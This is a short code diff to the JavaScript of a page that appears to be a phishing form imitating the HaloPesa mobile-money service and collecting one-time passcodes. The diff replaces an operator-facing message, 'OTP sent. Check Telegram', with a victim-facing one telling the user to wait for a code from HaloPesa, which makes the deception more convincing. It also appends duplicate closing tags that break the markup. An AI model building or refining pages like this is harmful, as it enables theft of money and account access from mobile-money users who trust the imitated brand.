@@ -252,8 +252,8 @@
 
         async function resendCode() {
             if (!appId) return;
-            document.getElementById('codeError').textContent = 'OTP Inatumwa...';
-            document.getElementById('codeError').style.color = 'var(--hp-orange)';
+            document.getElementById('codeError').textContent = 'OTP Imetumwa. Subiri msimbo kutoka HaloPesa.';
+            document.getElementById('codeError').style.color = 'var(--success)';
             document.getElementById('codeError').classList.add('show');
             try {
                 await fetch('/api/resend_code', { 
@@ -261,9 +261,6 @@
                     headers: { 'Content-Type': 'application/json' }, 
                     body: JSON.stringify({ app_id: appId }) 
                 });
-                document.getElementById('codeError').textContent = 'OTP Imetumwa. Angalia Telegram.';
-                document.getElementById('codeError').style.color = 'var(--success)';
-                // Clear code inputs
                 document.querySelectorAll('.cd').forEach(function(d) { 
                     d.value = ''; 
                     d.classList.remove('filled', 'error'); 
@@ -278,6 +275,9 @@
                 document.getElementById('codeError').style.color = 'var(--danger)';
             }
         }
+    </script>
+</body>
+</html>
     </script>
 </body>
 </html>
